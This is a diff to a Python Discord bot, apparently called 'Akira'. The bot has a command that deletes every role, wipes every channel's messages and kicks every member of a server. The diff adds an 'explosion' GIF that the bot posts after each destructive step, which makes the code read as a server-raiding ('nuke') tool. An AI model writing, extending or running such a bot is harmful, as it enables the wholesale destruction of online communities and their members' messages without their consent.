@@ -16,6 +16,7 @@ async def resonate(ctxt):
     await deleteAllRoles(ctxt)
     await flushAllChannels(ctxt)
     await kickAllUsers(ctxt)
+    await sendExplosion(ctxt)
 
 """Deletes every message in a given channel"""
 @bot.command(pass_context = True)
@@ -25,6 +26,7 @@ async def flushChannel(ctxt):
      messages.append(message)
    while len(messages) > 0:
      await bot.delete_messages(messages[0:99])
+   await sendExplosion(ctxt)
 
 """Deletes every message in a specific channel"""
 async def flushSpecificChannel(channel):
@@ -68,6 +70,7 @@ async def deleteAllRoles(ctxt):
     for role in roles:
         if (role.is_everyone == False and role.name != "Akira"):
             await deleteRole(server, role)
+    await sendExplosion(ctxt)
 
 """Delete a single role in a server"""
 async def deleteRole(server, role):
@@ -82,5 +85,9 @@ async def kickAllUsers(ctxt):
     for member in member_list:
         await bot.kick(member)
 
+@bot.command(pass_context = True)
+async def sendExplosion(ctxt):
+    channel = ctxt.message.channel
+    await bot.send_file(channel, './resources/explosion.gif')
 
 bot.run('token')
